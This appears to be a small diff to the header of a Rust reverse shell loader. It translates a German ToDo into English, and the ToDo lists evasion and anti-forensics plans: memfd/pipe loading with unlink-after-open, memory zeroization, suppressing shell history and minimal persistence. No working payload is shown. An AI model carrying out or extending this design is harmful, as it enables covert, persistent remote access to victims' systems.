@@ -1,6 +1,9 @@
 // Hardened Reverse Shell Loader in Rust
 // Runtime-only payload: no hardcoded secrets or IPs
-// ToDo: memfd / pipe / unlink-after-open + zeroize + no History + minimale Persistenz.
+// ToDo: Integrate memfd/pipe with unlink-after-open,
+//       add more aggressive memory zeroization,
+//       prevent shell history,
+//       and implement minimal persistence mechanisms.
 
 use ring::aead::{Aad, LessSafeKey, Nonce, UnboundKey, AES_256_GCM};
 use std::env;
